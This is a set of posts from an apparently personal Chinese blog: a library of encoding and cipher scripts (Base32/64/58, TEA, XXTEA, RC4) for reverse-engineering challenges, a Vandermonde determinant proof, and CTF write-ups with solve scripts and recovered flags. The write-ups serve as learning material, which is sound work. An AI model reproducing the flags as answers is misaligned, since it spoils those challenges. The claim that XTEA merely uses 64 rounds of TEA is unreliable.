54 55\tfor (int i = 0; i \u0026lt; strlen(data(binstr)); i += 5) 56\t{ 57\tindex = 0; 58\tfor (int j = 0; j \u0026lt; 5; j++) 59\t{ 60\tif (binstr[i + j] == \u0026#39;1\u0026#39;) 61\t{ 62\tindex += pow(2, 4 - j); 63\t} 64\t} 65\tcipher += table[index]; 66\t} 67 68\tif (strlen(data(cipher)) % 8 != 0) // 填充等号 69\t{ 70\tcipher = paddingeq(cipher, binstr); 71\t} 72\tcout \u0026lt;\u0026lt; cipher; 73\treturn 0; 74} 解码脚本：\n1#include \u0026lt;iostream\u0026gt; 2#include \u0026lt;cstring\u0026gt; 3#include \u0026lt;bitset\u0026gt; 4#include \u0026lt;cmath\u0026gt; 5 6using namespace std; 7 8string dec2bin(int deci) 9{ 10\tbitset\u0026lt;5\u0026gt; bina(deci); 11\treturn bina.to_string(); 12} 13 14int main() 15{ 16\tstring table = \u0026#34;ABCDEFGHIJKLMNOPQRSTUVWXYZ234567\u0026#34;; 17\tstring binstr = \u0026#34;\u0026#34;; 18\tstring tmp; 19\tint index; 20\tint tmpbyte; 21\tstring message = \u0026#34;\u0026#34;; 22 23\tstring cipher; 24\tcin \u0026gt;\u0026gt; cipher; 25 26\tfor (auto i : cipher) // 去除等号 27\t{ 28\tif (i == \u0026#39;=\u0026#39;) 29\t{ 30\tbreak; 31\t} 32\telse 33\t{ 34\tindex = table.find(i); 35\tbinstr += dec2bin(index); 36\t} 37\t} 38 39\tint rest = strlen(data(binstr)) % 8; // 忽略用于填充的 0 40\t41\tfor (int i = 0; i \u0026lt; strlen(data(binstr)) - rest; i += 8) 42\t{ 43\ttmpbyte = 0; 44\ttmp = binstr.substr(i, 8); // 以每组 8 bits 截取 45\tfor (int j = 0; j \u0026lt; 8; j++) 46\t{ 47\tif (tmp[j] == \u0026#39;1\u0026#39;) 48\t{ 49\ttmpbyte += pow(2, 7 - j); 50\t} 51\t} 52\tmessage += char(tmpbyte); 53\t} 54 55\tcout \u0026lt;\u0026lt; message; 56\treturn 0; 57} 特征：32 位编码表，最后可能出现多个填充字符，填充字符不超过 6 个。\nBase64 Uuencode XXencode 编码脚本：\n1#include \u0026lt;iostream\u0026gt; 2 3using namespace std; 4 5string encode_main(string message) 6{ 7\tstring cipher = \u0026#34;\u0026#34;; 8\tstring table = \u0026#34;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\u0026#34;; 9\tfor (int i = 0; i \u0026lt; strlen(data(message)); i += 3) 10\t{ 11\tcipher += table[(int(message[i]) \u0026gt;\u0026gt; 2) \u0026amp; 0b111111]; 12\tcipher += table[((int(message[i]) \u0026lt;\u0026lt; 4) \u0026amp; 0b110000) | (int((message[i + 1]) \u0026gt;\u0026gt; 4) \u0026amp; 0b1111)]; 13\tcipher += table[((int(message[i + 1]) \u0026lt;\u0026lt; 2) \u0026amp; 0b111100) | (int(message[i + 2]) \u0026gt;\u0026gt; 6)\u0026amp;0b11]; 14\tcipher += table[(int(message[i + 2])) \u0026amp; 0b111111]; 15\t} 16\treturn cipher; 17} 18 19string encode_sub(string message) 20{ 21\tint len = strlen(data(message)); // 剩余字符串长度 22\tstring cipher = \u0026#34;\u0026#34;; 23\tstring table = \u0026#34;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\u0026#34;; 24 25\tswitch (len) 26\t{ 27\tcase 1: 28\tcipher += table[(int(message[0]) \u0026gt;\u0026gt; 2) \u0026amp; 0b111111]; 29\tcipher += table[(int(message[0]) \u0026lt;\u0026lt; 4) \u0026amp; 0b110000]; 30\tcipher += \u0026#34;==\u0026#34;; 31\tbreak; 32\tcase 2: 33\tcipher += table[(int(message[0]) \u0026gt;\u0026gt; 2) \u0026amp; 0b111111]; 34\tcipher += table[((int(message[0]) \u0026lt;\u0026lt; 4) \u0026amp; 0b110000) | (int((message[1]) \u0026gt;\u0026gt; 4) \u0026amp; 0b1111)]; 35\tcipher += table[(int(message[1]) \u0026lt;\u0026lt; 2) \u0026amp; 0b111100]; 36\tcipher += \u0026#39;=\u0026#39;; 37\tbreak; 38\tdefault: 39\tbreak; 40\t} 41 42\treturn cipher; 43} 44 45int main() 46{ 47\tstring message; 48\tcin \u0026gt;\u0026gt; message; 49 50\tint mainstrlen = strlen(data(message)) - (strlen(data(message)) % 3); // 去除需要填充部分 51\tstring mainstr = message.substr(0, mainstrlen); 52\tstring cipher0 = encode_main(mainstr); // 满三字节的部分进行编码 53\t54\tstring substrg = message.substr(mainstrlen); 55\tstring cipher1 = encode_sub(substrg); // 填充等号 56 57\tstring cipher = cipher0 + cipher1; 58\tcout \u0026lt;\u0026lt; cipher; 59\treturn 0; 60} XXencode 本质上是一种变表 Base64，其编码表为 +-0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz 且无需填充字符。 UUencode 的算法与 Base64 有细微差异，但在实现后也是一种 Base64 变表算法，其编码表为 !\u0026quot;#$%\u0026amp;'()*+,-./0123456789:;\u0026lt;=\u0026gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_，也无需填充字符。 Base32 也可以像 Base64 一样通过判断编码后的长度填充等号，不过那样需要做多次判断；Base64 也可以像本文中 Base32 编码的脚本一样通过模运算判断需要填充等号的数量。两种方法对比学习。\n解码脚本：\n1#include \u0026lt;iostream\u0026gt; 2#include \u0026lt;bitset\u0026gt; 3 4using namespace std; 5 6string dec2bin(int deci) 7{ 8\tbitset\u0026lt;6\u0026gt; bina(deci); 9\treturn bina.to_string(); 10} 11 12int main() 13{ 14\tstring binstr = \u0026#34;\u0026#34;; 15\tstring table = \u0026#34;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\u0026#34;; 16\tstring tmp; 17\tint index; 18\tint tmpbyte; 19\tstring message = \u0026#34;\u0026#34;; 20 21\tstring cipher; 22\tcin \u0026gt;\u0026gt; cipher; 23 24\tfor (auto i : cipher) 25\t{ 26\tif (i == \u0026#39;=\u0026#39;) // 去除补位等号 27\t{ 28\tbreak; 29\t} 30\telse 31\t{ 32\tindex = table.find(i); 33\tbinstr += dec2bin(index); 34\t} 35\t} 36 37\tint rest = strlen(data(binstr)) % 8; // 忽略用于填充的 0 38 39\tfor (int i = 0; i \u0026lt; strlen(data(binstr)) - rest; i += 8) 40\t{ 41\ttmpbyte = 0; 42\ttmp = binstr.substr(i, 8); // 以每组 8 bits 截取 43\tfor (int j = 0; j \u0026lt; 8; j++) 44\t{ 45\tif (tmp[j] == \u0026#39;1\u0026#39;) 46\t{ 47\ttmpbyte += pow(2, 7 - j); 48\t} 49\t} 50\tmessage += char(tmpbyte); 51\t} 52 53\tcout \u0026lt;\u0026lt; message; 54\treturn 0; 55} 这个解码脚本和 Base32 的解码脚本几乎一样，唯一区别就在 dec2bin() 函数中将 Base32 的 5 bits 一截变成 6 bits 一截。\n特征：编码表长为 64，有形如 cipher += table[((int(message[0]) \u0026lt;\u0026lt; 4) \u0026amp; 0b110000) | (int((message[1]) \u0026gt;\u0026gt; 4) \u0026amp; 0b1111)]; 这样对单个字节进行左右位移操作（需要与一些数字做按位与运算以确保只保留需要的 bits）并且最终得到长度为 6 bits 的数据。\nBase58 Base58 编码的本质是将字符串 bytes_to_long() 后进行转换为 58 进制。\n在这种需要使用进制转换的编码中，需要将文本的二进制首尾相接组成一个大数，但是 C++ 又有数据宽度的限制，我也懒得重复造大数运算的轮子，故这一脚本使用 Python 书写，其中用到的“轮子”仅有 Python 大数运算与 long_to_bytes() 函数。\nBase58 编码脚本（58 进制转换脚本）：\n1from Crypto.Util.number import bytes_to_long 2 3table = \u0026#34;123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz\u0026#34; # 编码表 4message = input() 5strnum = bytes_to_long(message.encode()) 6cipher = \u0026#34;\u0026#34; 7 8while strnum: # 进制转换 9 tmp = strnum % 58 10 cipher = table[tmp] + cipher 11 strnum //= 58 12 13print(cipher) 根据这个脚本，我们实际上可以轻松改出一个任意进制转换或者进制转换爆破的脚本（或者说是 BaseX 编码脚本）。\n解码脚本：\n1from Crypto.Util.number import long_to_bytes 2 3table = \u0026#34;123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz\u0026#34; 4cipher = input() 5strnum = 0 6 7ciplen = len(cipher) 8for i in range(ciplen): 9 ind = table.index(cipher[ciplen - i - 1]) 10 strnum += ind * 58 ** i 11 12binstr = bin(strnum)[2::] 13 14strnum = int(binstr, 2) 15message = long_to_bytes(strnum) 16print(message.decode()) 特征：长得像进制转换。\n对称加密 TEA XTEA TEA 加密：\n1#include \u0026lt;iostream\u0026gt; 2 3using namespace std; 4 5const int DELTA = 0x9e3779b9;\t// DELTA 为常量，是 TEA 系列加密算法的重要常数，某些题目可能会悄悄修改这个值 6const int ROUNDS = 32; // 迭代轮数，TEA 加密是 32 轮，XTEA 加密是 64 轮，某些题目会在这里做手脚（QQ 是 16 轮） 7 8void teaencrypt(unsigned int* message, unsigned int* key, unsigned int* cipher) // 数据类型为无符号整型，下同，需要注意 9{ 10\tfor (int i = 0; i \u0026lt; 6; i += 2) // 跳出循环的条件改成明文长度 11\t{ 12\tunsigned int l = message[i], r = message[i + 1]; 13\tunsigned int k0 = key[0], k1 = key[1], k2 = key[2], k3 = key[3]; 14\tunsigned int sum = 0; 15\tfor (int j = 0; j \u0026lt; ROUNDS; j++) //核心加密算法 16\t{ 17\tl += ((r \u0026lt;\u0026lt; 4) + k0) ^ (r + sum) ^ ((r \u0026gt;\u0026gt; 5) + k1); 18\tr += ((l \u0026lt;\u0026lt; 4) + k2) ^ (l + sum) ^ ((l \u0026gt;\u0026gt; 5) + k3); 19\tsum += DELTA;\t20\t} 21 22\tcipher[i] = l; 23\tcipher[i + 1] = r; 24\t} 25} 26 27int main() 28{ 29\tunsigned int message[6] = { 0x378dc527, 0x2809af71, 0xb3371ac9, 0x647dbb8c, 0x45afddff, 0x36abd15d }; // 应当把这里替换成真正的明文，明文长度是 8 字节的倍数 30\tunsigned int key[4] = { 0xa96a5bc4, 0xac7afdb5, 0x7c8a1209, 0x350de6d0 }; // 应当把这里替换成真正的密钥 31\tunsigned int cipher[6] = { 0 }; // 将密文初始化为 0 32 33\tteaencrypt(message, key, cipher); 34\t35\tfor (int i = 0; i \u0026lt; 6; i++) // 以十六进制循环输出密文 36\t{ 37\tcout \u0026lt;\u0026lt; hex \u0026lt;\u0026lt; cipher[i] \u0026lt;\u0026lt; \u0026#39; \u0026#39;; 38\t} 39\t40\treturn 0; 41} TEA 解密脚本就是把核心加密算法中的三行倒着写一遍：\n1#include \u0026lt;iostream\u0026gt; 2 3using namespace std; 4 5const int DELTA = 0x9e3779b9;\t// DELTA 为常量，是 TEA 系列加密算法的重要常数，某些题目可能会悄悄修改这个值 6const int ROUNDS = 32; // 迭代轮数，TEA 加密是 32 轮，XTEA 加密是 64 轮，某些题目会在这里做手脚（QQ 是 16 轮） 7 8void teaencrypt(unsigned int* message, unsigned int* key, unsigned int* cipher) // 数据类型为无符号整型，下同，需要注意 9{ 10\tfor (int i = 0; i \u0026lt; 6; i += 2) // 跳出循环的条件改成明文长度 11\t{ 12\tunsigned int l = cipher[i], r = cipher[i + 1]; 13\tunsigned int k0 = key[0], k1 = key[1], k2 = key[2], k3 = key[3]; 14\tunsigned int sum = 0xc6ef3720; // sum 是 DELTA * ROUNDS 的结果，如果 DELTA 或 ROUNDS 变化，sum 也会变化 15\tfor (int j = 0; j \u0026lt; ROUNDS; j++) //核心解密算法，就是将加密算法倒着写一遍 16\t{ 17\tsum -= DELTA; 18\tr -= ((l \u0026lt;\u0026lt; 4) + k2) ^ (l + sum) ^ ((l \u0026gt;\u0026gt; 5) + k3); 19\tl -= ((r \u0026lt;\u0026lt; 4) + k0) ^ (r + sum) ^ ((r \u0026gt;\u0026gt; 5) + k1); 20\t} 21 22\tmessage[i] = l; 23\tmessage[i + 1] = r; 24\t} 25} 26 27int main() 28{ 29\tunsigned int cipher[6] = { 0x5ff4166b, 0x49871e4e, 0x4c64aebc, 0x90a92d2f, 0x3816c22, 0x1d233ce8 }; // 应当把这里替换成真正的密文，密文长度是 8 字节的倍数 30\tunsigned int key[4] = { 0xa96a5bc4, 0xac7afdb5, 0x7c8a1209, 0x350de6d0 }; // 应当把这里替换成真正的密钥 31\tunsigned int message[6] = { 0 }; // 明文长度和密文长度相等 32 33\tteaencrypt(message, key, cipher); 34 35\tfor (int i = 0; i \u0026lt; 6; i++) // 以十六进制循环输出明文 36\t{ 37\tcout \u0026lt;\u0026lt; hex \u0026lt;\u0026lt; message[i] \u0026lt;\u0026lt; \u0026#39; \u0026#39;; 38\t} 39 40\treturn 0; 41} XTEA 加密就是将加密迭代次数 ROUNDS 改为了 64 轮。\n特征：DELTA，以及核心算法的三行。\nXXTEA XXTEA 加密算法看起来与 TEA 加密算法截然不同：\n1#include \u0026lt;iostream\u0026gt; 2 3using namespace std; 4 5const int DELTA = 0x9e3779b9; 6 7void xxteaencrypt(unsigned int* key, unsigned int* cipher, int n) // 核心加密算法 8{ 9\tunsigned int rounds = 6 + 52 / n; // 计算加密轮数 10\tunsigned int y, z = cipher[n - 1]; 11\tunsigned int sum = 0, p, e; 12 13\twhile (rounds-- \u0026gt; 0) 14\t{ 15\tsum += DELTA; 16\te = (sum \u0026gt;\u0026gt; 2) \u0026amp; 3; 17 18\tfor (p = 0; p \u0026lt; n - 1; p++) 19\t{ 20\ty = cipher[p + 1]; 21\tz = cipher[p] += (((z \u0026gt;\u0026gt; 5 ^ y \u0026lt;\u0026lt; 2) + (y \u0026gt;\u0026gt; 3 ^ z \u0026lt;\u0026lt; 4)) ^ ((sum ^ y) + (key[(p \u0026amp; 3) ^ e] ^ z))); 22\t} 23 24\ty = cipher[0]; 25\tz = cipher[n - 1] += (((z \u0026gt;\u0026gt; 5 ^ y \u0026lt;\u0026lt; 2) + (y \u0026gt;\u0026gt; 3 ^ z \u0026lt;\u0026lt; 4)) ^ ((sum ^ y) + (key[(p \u0026amp; 3) ^ e] ^ z))); 26\t} 27} 28 29int main() 30{ 31\tunsigned int message[6] = { 0x378dc527, 0x2809af71, 0xb3371ac9, 0x647dbb8c, 0x45afddff, 0x36abd15d }; 32\tunsigned int key[4] = { 0xa96a5bc4, 0xac7afdb5, 0x7c8a1209, 0x350de6d0 }; 33\tunsigned int* cipher = message; 34\tint n = 6; // 数据块数量，用于在加密算法中计算加密轮数 35 36\txxteaencrypt(key, cipher, n); 37 38\tfor (int i = 0; i \u0026lt; 6; i++) 39\t{ 40\tcout \u0026lt;\u0026lt; hex \u0026lt;\u0026lt; cipher[i] \u0026lt;\u0026lt; \u0026#39; \u0026#39;; 41\t} 42 43\treturn 0; 44} 解密脚本：\n1#include \u0026lt;iostream\u0026gt; 2 3using namespace std; 4 5const int DELTA = 0x9e3779b9; 6 7void xxteadecrypt(unsigned int* key, unsigned int* message, int n) 8{ 9\tunsigned int rounds = 6 + 52 / n; // 计算加密轮数 10\tunsigned int y = message[0], z; 11\tunsigned int sum = rounds * DELTA, p, e; 12 13\twhile (rounds-- \u0026gt; 0) 14\t{ 15\te = (sum \u0026gt;\u0026gt; 2) \u0026amp; 3; 16 17\tfor (p = n - 1; p \u0026gt; 0; p--) 18\t{ 19\tz = message[p - 1]; 20\ty = message[p] -= (((z \u0026gt;\u0026gt; 5 ^ y \u0026lt;\u0026lt; 2) + (y \u0026gt;\u0026gt; 3 ^ z \u0026lt;\u0026lt; 4)) ^ ((sum ^ y) + (key[(p \u0026amp; 3) ^ e] ^ z))); 21\t} 22 23\tz = message[n - 1]; 24\ty = message[0] -= (((z \u0026gt;\u0026gt; 5 ^ y \u0026lt;\u0026lt; 2) + (y \u0026gt;\u0026gt; 3 ^ z \u0026lt;\u0026lt; 4)) ^ ((sum ^ y) + (key[(p \u0026amp; 3) ^ e] ^ z))); 25\tsum -= DELTA; 26\t} 27} 28 29int main() 30{ 31\tunsigned int cipher[6] = { 0xbe061ed4, 0x84afc0b0, 0xd533f957, 0xf12e35ab, 0xd5dd1f5e, 0xc0e97f4b }; 32\tunsigned int key[4] = { 0xa96a5bc4, 0xac7afdb5, 0x7c8a1209, 0x350de6d0 }; 33\tunsigned int* message = cipher; 34\tint n = 6; 35 36\txxteadecrypt(key, message, n); // 在发明者给出的脚本中，n 的正负决定程序执行加密还是解密，n 为正时加密，n 为负时解密，但是解密算法里实际使用到 n 的时候依然要使用正数 37 38\tfor (int i = 0; i \u0026lt; n; i++) 39\t{ 40\tcout \u0026lt;\u0026lt; hex \u0026lt;\u0026lt; message[i] \u0026lt;\u0026lt; \u0026#39; \u0026#39;; 41\t} 42 43\treturn 0; 44} RC4 RC4 加密有一个非常显著的特点，就是加密和解密可以用同一段代码实现。类似于 ROT13，把 RC4 加密得到的密文使用相同的密码再加密一遍，就可以得到明文。理论上讲，如果在题目里遇到了 RC4 加密，可以把密文塞回程序再跑一边，明文就自己出来了。\n1#include \u0026lt;iostream\u0026gt; 2#include \u0026lt;iomanip\u0026gt; 3 4using namespace std; 5 6void swap(int\u0026amp; a, int\u0026amp; b) 7{ 8 int tmp = a; 9 a = b; 10 b = tmp; 11} 12 13void init(int* S, int* T, string key) 14{ 15 int keylen = key.length(); 16 17 for (int j = 0; j \u0026lt; 256; j++) // 初始化 S 盒、T 表 18 { 19 S[j] = j; 20 T[j] = key[j % keylen]; 21 } 22} 23 24void KSA(int* S, int* T) 25{ 26 int j = 0; 27 for (int i = 0; i \u0026lt; 256; i++) 28 { 29 j = (j + S[i] + T[i]) % 256; 30 swap(S[i], S[j]); 31 } 32} 33 34void PRGA(int* S, int* D, string message) 35{ 36 int i = 0, j = 0, t; 37 for (int h = 0; h \u0026lt; message.length(); h++) 38 { 39 i = (i + 1) % 256; 40 j = (j + S[i]) % 256; 41 swap(S[i], S[j]); // 生成伪随机 42 t = (S[i] + S[j]) % 256; 43 D[h] = S[t] ^ message[h]; 44 } 45} 46 47int main() 48{ 49 string message, key; 50 int S[256] = { 0 }, T[256] = { 0 }, D[256] = { 0 }; 51 cin \u0026gt;\u0026gt; message; 52 cin \u0026gt;\u0026gt; key; 53 54 init(S, T, key); 55 KSA(S, T); 56 PRGA(S, D, message); 57 58 for (int i = 0; i \u0026lt; message.length(); i++) 59 { 60 printf(\u0026#34;%02x \u0026#34;, D[i]); // 输出两位十六进制数 61 } 62 63 return 0; 64} 这里是一个加密脚本，因此使用 cin 输入数据。\n特征：分为两部分操作，KSA（生成密钥流）与 PRGA（生成伪随机）。\n","link":"https://jackgdn.github.io/post/%E8%84%9A%E6%9C%AC%E5%BA%93/","section":"post","tags":["Reverse","C++","Python"],"title":"逆向相关算法脚本（暂时停更）"},{"body":"","link":"https://jackgdn.github.io/tags/crypto/","section":"tags","tags":null,"title":"Crypto"},{"body":"","link":"https://jackgdn.github.io/tags/wp/","section":"tags","tags":null,"title":"WP"},{"body":"","link":"https://jackgdn.github.io/categories/wp/","section":"categories","tags":null,"title":"WP"},{"body":"范德蒙德行列式：\n$$ \\begin{vmatrix}1 \u0026amp; 1 \u0026amp; \\cdots \u0026amp; 1 \\\\ x_1 \u0026amp; x_2 \u0026amp; \\cdots \u0026amp; x_n \\\\ x_1^2 \u0026amp; x_2^2 \u0026amp; \\cdots \u0026amp; x_n^2 \\\\ \\vdots \u0026amp; \\vdots \u0026amp; \\ddots \u0026amp; \\vdots \\\\ x_1^{n-1} \u0026amp; x_2^{n-1} \u0026amp; \\cdots \u0026amp; x_n^{n-1} \\end{vmatrix} = \\prod_{n \\ge i \u0026gt; j \\ge 1}(x_i-x_j) $$\n证明如下：\n从第 $n$ 行开始，将行列式中的后一行减去前一行的 $x_1$ 倍，得到下式：\n$$ \\begin{align*} \\begin{vmatrix} 1 \u0026amp; 1 \u0026amp; \\cdots \u0026amp; 1 \\\\ 0 \u0026amp; x_2-x_1 \u0026amp; \\cdots \u0026amp; x_n-x_1 \\\\ 0 \u0026amp; x_2(x_2-x_1) \u0026amp; \\cdots \u0026amp; x_n(x_n-x_1) \\\\ \\vdots \u0026amp; \\vdots \u0026amp; \\ddots \u0026amp; \\vdots \\\\ 0 \u0026amp; x_2^{n-2}(x_2-x_1) \u0026amp; \\cdots \u0026amp; x_n^{n-2}(x_n-x_1) \\end{vmatrix}\\\\ \\ \\\\ \\ \\\\ = \\begin{vmatrix} 1 \u0026amp; 1 \u0026amp; \\cdots \u0026amp; 1 \\\\ 0 \u0026amp; x_2-x_1 \u0026amp; \\cdots \u0026amp; x_n-x_1 \\\\ 0 \u0026amp; x_2(x_2-x_1) \u0026amp; \\cdots \u0026amp; x_n(x_n-x_1) \\\\ \\vdots \u0026amp; \\vdots \u0026amp; \\ddots \u0026amp; \\vdots \\\\ 0 \u0026amp; x_2^{n-2}(x_2-x_1) \u0026amp; \\cdots \u0026amp; x_n^{n-2}(x_n-x_1) \\end{vmatrix} \\end{align*} $$\n将得到的行列式按第 $1$ 行展开，得到\n$$ \\begin{align*} \u0026amp;\\begin{vmatrix} x_2-x_1 \u0026amp; x_3-x_1 \u0026amp; \\cdots \u0026amp; x_n-x_1 \\\\ x_2(x_2-x_1) \u0026amp; x_3(x_3-x_1) \u0026amp; \\cdots \u0026amp; x_n(x_n-x_1) \\\\ \\vdots \u0026amp; \\vdots \u0026amp; \\ddots \u0026amp; \\vdots \\\\ x_2^{n-2}(x_2-x_1) \u0026amp; x_3^{n-2}(x_3-x_1) \u0026amp; \\cdots \u0026amp; x_n^{n-2}(x_n-x_1) \\end{vmatrix} \\\\ \\ \\\\ \\ \\\\ \u0026amp;= (x_2-x_1)(x_3-x_1) \\cdots (x_n-x_1) \\begin{vmatrix} 1 \u0026amp; 1 \u0026amp; \\cdots \u0026amp; 1 \\\\ x_2 \u0026amp; x_3 \u0026amp; \\cdots \u0026amp; x_n \\\\ \\vdots \u0026amp; \\vdots \u0026amp; \\ddots \u0026amp; \\vdots \\\\ x_2^{n-2} \u0026amp; x_3^{n-2} \u0026amp; \\cdots \u0026amp; x_n^{n-2} \\end{vmatrix} \\end{align*} $$\n此时该式右端为一个 $n-1$ 阶的范德蒙德行列式，可以写成：\n$$ (x_3-x_2)(x_4-x_2) \\cdots (x_n-x_2) \\begin{vmatrix} 1 \u0026amp; 1 \u0026amp; \\cdots \u0026amp; 1 \\\\ x_3 \u0026amp; x_4 \u0026amp; \\cdots \u0026amp; x_n \\\\ \\vdots \u0026amp; \\vdots \u0026amp; \\ddots \u0026amp; \\vdots \\\\ x_3^{n-3} \u0026amp; x_4^{n-3} \u0026amp; \\cdots \u0026amp; x_3^{n-3} \\end{vmatrix} $$\n根据数学归纳法，可以把范德蒙德行列式写作：\n$$ \\begin{align*} \u0026amp;(x_2-x_1)(x_3-x_1) \\cdots (x_n-x_1)(x_3-x_2)(x_4-x_2) \\cdots (x_n-x_{n-1}) \\\\ \\ \\\\ \\ \\\\ \u0026amp;= \\prod_{n \\ge i \u0026gt; j \\ge 1}(x_i-x_j) \\end{align*} $$\n证毕。\n","link":"https://jackgdn.github.io/post/%E8%8C%83%E5%BE%B7%E8%92%99%E5%BE%B7%E8%A1%8C%E5%88%97%E5%BC%8F%E8%AF%81%E6%98%8E/","section":"post","tags":["线性代数","数学"],"title":"范德蒙德行列式证明"},{"body":"[SWPU2019] ReverseMe 乍一看 main() 函数里没有什么东西。切到反汇编界面，我们看到了一位老朋友——SEH。\n通过使用“广撒网”的打断点方式（在每一个可疑的 call 指令打断点），找到输入函数的位置：\n紧接着下面就对输入内容的长度进行判定，输入内容的长度为 0x20。\n继续调试，可以看到输入的内容在下面位置进行了异或操作：\n最后在下面与密文进行比较：\n根据此操作的特点，流程图模式中指向自己的代码块更可能是执行加密算法的部分。\n提取数据后使用脚本解密：\n1k1 = \u0026#39;SWPU_2019_CTF\u0026#39; 2k2 = [ 3 0x86, 0x0C, 0x3E, 0xCA, 0x98, 0xD7, 0xAE, 0x19, 0xE2, 0x77, 4 0x6B, 0xA6, 0x6A, 0xA1, 0x77, 0xB0, 0x69, 0x91, 0x37, 0x05, 5 0x7A, 0xF9, 0x7B, 0x30, 0x43, 0x5A, 0x4B, 0x10, 0x86, 0x7D, 6 0xD4, 0x28 7] 8k3 = [ 9 0xB3, 0x37, 0x0F, 0xF8, 0xBC, 0xBC, 0xAE, 0x5D, 0xBA, 0x5A, 10 0x4D, 0x86, 0x44, 0x97, 0x62, 0xD3, 0x4F, 0xBA, 0x24, 0x16, 11 0x0B, 0x9F, 0x72, 0x1A, 0x65, 0x68, 0x6D, 0x26, 0xBA, 0x6B, 12 0xC8, 0x67 13] 14 15for i in range(0x20): 16 print(chr(ord(k1[i % 13]) ^ k2[i] ^ k3[i]), end = \u0026#39;\u0026#39;) 17 18# output: flag{Y0uaretheB3st!#@_VirtualCC} buuctf - rsa 不是很懂，为什么一道 RSA 被放到了逆向里。\n题目附件中有两个文件： pub.key 和 flag.enc。\n万事俱备，直接解：\n1from Crypto.PublicKey import RSA 2 3with open(\u0026#39;pub.key\u0026#39;, \u0026#39;r\u0026#39;) as pubkey: 4 key = RSA.importKey(pubkey.read()) 5 6print(key.n) 7 8# output: 86934482296048119190666062003494800588905656017203025617216654058378322103517 上面的脚本从 pub.key 中读取出了 n，分解后可以解出 flag：\n1from Crypto.Util.number import * 2import gmpy2 3 4n = 86934482296048119190666062003494800588905656017203025617216654058378322103517 5p = 285960468890451637935629440372639283459 6q = 304008741604601924494328155975272418463 7e = 65537 8 9phi = (p - 1) * (q - 1) 10d = gmpy2.invert(e, phi) 11 12with open(\u0026#39;flag.enc\u0026#39;, \u0026#39;rb\u0026#39;) as flag: 13 c = bytes_to_long(flag.read()) 14 15m = pow(c, d, n) 16print(long_to_bytes(m)) 17 18# output: b\u0026#39;\\x02\\x9d {zR\\x1e\\x08\\xe4\\xe6\\x18\\x06\\x00flag{decrypt_256}\\n\u0026#39; [QCTF2018] Xman-babymips 题目唯一亮点在于它是 MIPS 架构汇编，不过用 IDA 7.7 照样可以反编译。\n核心代码：\n1int __fastcall main(int a1, char **a2, char **a3) 2{ 3 int i; // [sp+18h] [+18h] BYREF 4 char v5[36]; // [sp+1Ch] [+1Ch] BYREF 5 6 setbuf(stdout, 0); 7 setbuf(stdin, 0); 8 printf(\u0026#34;Give me your flag:\u0026#34;); 9 scanf(\u0026#34;%32s\u0026#34;, v5); 10 for ( i = 0; i \u0026lt; 32; ++i ) 11 v5[i] ^= 32 - i; 12 if ( !strncmp(v5, fdata, 5u) ) 13 return sub_4007F0(v5); 14 else 15 return puts(\u0026#34;Wrong\u0026#34;); 16} 17 18int __fastcall sub_4007F0(const char *a1) 19{ 20 char v1; // $v1 21 size_t i; // [sp+18h] [+18h] 22 23 for ( i = 5; i \u0026lt; strlen(a1); ++i ) 24 { 25 if ( (i \u0026amp; 1) != 0 ) 26 v1 = (a1[i] \u0026gt;\u0026gt; 2) | (a1[i] \u0026lt;\u0026lt; 6); 27 else 28 v1 = (4 * a1[i]) | (a1[i] \u0026gt;\u0026gt; 6); 29 a1[i] = v1; 30 } 31 if ( !strncmp(a1 + 5, off_410D04, 0x1Bu) ) 32 return puts(\u0026#34;Right!\u0026#34;); 33 else 34 return puts(\u0026#34;Wrong!\u0026#34;); 35} 我 NT 了，竟然在这道题上卡住，主要是脚本写的有问题。正确脚本如下：\n1c = [ 2 0x51, 0x7C, 0x6A, 0x7B, 0x67, 0x52, 0xFD, 3 0x16, 0xA4, 0x89, 0xBD, 0x92, 0x80, 0x13, 0x41, 0x54, 0xA0, 4 0x8D, 0x45, 0x18, 0x81, 0xDE, 0xFC, 0x95, 0xF0, 0x16, 0x79, 5 0x1A, 0x15, 0x5B, 0x75, 0x1F 6] 7 8for i in range(5, 32): 9 if i % 2 == 0: 10 c[i] = (c[i] \u0026gt;\u0026gt; 2 | c[i] \u0026lt;\u0026lt; 6) \u0026amp; 0x7F 11 else: 12 c[i] = (c[i] \u0026lt;\u0026lt; 2 | c[i] \u0026gt;\u0026gt; 6) \u0026amp; 0x7F 13 14for i in range(32): 15 print(chr(c[i] ^ 32 - i), end = \u0026#39;\u0026#39;) 16 17# output: qctf{ReA11y_4_B@89_mlp5_4_XmAn_} [WMCTF2020] easy_re 这道题的程序使用 Perl 语言编写，随后通过 ActivePerl 将代码打包成可执行文件。运行程序，程序会输出 \u0026quot;please input the flag:\u0026quot; 提示输入 flag。但是在 IDA 中搜索字符串，无法找到相应字符串。\n根据已知的信息，Perl 语言在打包成可执行文件时，会将解释器、编译器与压缩后的代码一同装进可执行文件中。在执行时，程序会首先初始化编译器，随后解压代码并执行代码。在执行源代码，程序会向栈内压入一个字符串 \u0026quot;script\u0026quot; 用于标记。因此搜索字符串 \u0026quot;script\u0026quot; 并定位到这里。\n上图中 sub_40D1A0() 是解压 Perl 脚本的部分，解压完成后原始 Perl 脚本地址会存储在 rax 寄存器中。\n经调试可以得到原始 Perl 脚本：\n1$flag = \u0026#34;WMCTF{I_WAnt_dynam1c_F1ag}\u0026#34;; 2print \u0026#34;please input the flag:\u0026#34;; 3$line = \u0026lt;STDIN\u0026gt;; 4chomp($line); 5if($line eq $flag){ 6\tprint \u0026#34;congratulation!\u0026#34; 7}else{ 8\tprint \u0026#34;no,wrong\u0026#34; 9} flag 一目了然。\n","link":"https://jackgdn.github.io/post/%E8%BF%91%E6%9C%9F%E8%A7%A3%E9%A2%98_20240314/","section":"post","tags":["Reverse","Crypto","WP"],"title":"近期解题 